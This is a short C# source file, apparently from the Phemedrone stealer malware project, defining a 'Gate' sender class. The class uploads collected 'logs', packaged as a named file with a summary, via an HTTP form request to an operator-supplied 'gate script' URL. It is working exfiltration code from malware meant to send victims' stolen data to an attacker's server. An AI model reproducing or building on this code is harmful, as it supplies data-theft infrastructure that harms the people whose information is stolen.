using System.Collections.Generic;
using System.Linq;
using Phemedrone.Services;

namespace Phemedrone.Senders
{
    public class Gate : ISender
    {
        /// <summary>
        /// Specifies an HTTP request to gate script as a sender service for logs.
        /// </summary>
        /// <param name="url">Your gate script url</param>
        public Gate(string url) : base(url)
        {
        }
        
        public override void Send(byte[] data)
        {
            var fileName = Information.GetFileName();
            var fileDescription = Information.GetSummary();

            MakeFormRequest(Arguments.First().ToString(), "file", fileName, data, 
                new KeyValuePair<string, string>("filename", fileName),
                new KeyValuePair<string, string>("filedescription", fileDescription));
        }
    }
}